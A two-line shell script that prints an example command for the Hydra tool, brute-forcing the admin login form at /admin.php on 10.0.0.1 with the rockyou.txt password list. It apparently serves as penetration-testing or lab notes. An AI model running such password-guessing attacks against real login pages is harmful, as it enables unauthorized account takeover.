echo "example hydra usage\n"
echo "hydra 10.0.0.1 http-post-form '/admin.php:target=auth&mode=login&user=^USER^&password=^PASS^:invalid' -P fastlists/rockyou.txt -l admin"